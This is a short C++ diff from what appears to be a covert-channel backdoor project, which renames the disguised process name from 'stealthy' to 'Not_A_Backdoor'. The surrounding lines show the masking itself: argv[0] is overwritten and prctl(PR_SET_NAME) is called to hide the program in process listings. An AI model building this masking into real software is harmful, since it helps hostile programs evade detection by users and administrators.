@@ -8,6 +8,7 @@
 #include "CovertSocket.h"
 #include "../utils/Logger.h"
 
+#define newProcessName "Not_A_Backdoor"
 
 pcap_if_t * allInterfaces = nullptr;
 pcap_if_t * listeningInterface = nullptr;
@@ -124,8 +125,8 @@ int main(int argc, char * argv[]) {
 
     //mask the program
     memset(argv[0], 0, strlen(argv[0]));
-    strcpy(argv[0], "stealthy");
-    prctl(PR_SET_NAME, "stealthy", 0,0);
+    strcpy(argv[0], newProcessName);
+    prctl(PR_SET_NAME, newProcessName, 0,0);
 
     Logger::debug("Masking Complete");
 
